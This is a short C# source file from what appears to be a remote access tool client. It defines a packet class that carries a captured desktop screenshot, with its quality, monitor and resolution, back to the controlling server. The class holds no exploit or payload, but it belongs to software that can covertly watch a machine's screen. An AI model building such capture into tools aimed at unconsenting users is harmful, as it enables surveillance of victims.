﻿using System;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ClientPaketleri
{
    [Serializable]
    public class GetDesktopResponse : IPacket
    {
        public byte[] Image { get; set; }

        public int Quality { get; set; }

        public int Monitor { get; set; }

        public string Resolution { get; set; }

        public GetDesktopResponse()
        {
        }

        public GetDesktopResponse(byte[] image, int quality, int monitor, string resolution)
        {
            this.Image = image;
            this.Quality = quality;
            this.Monitor = monitor;
            this.Resolution = resolution;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}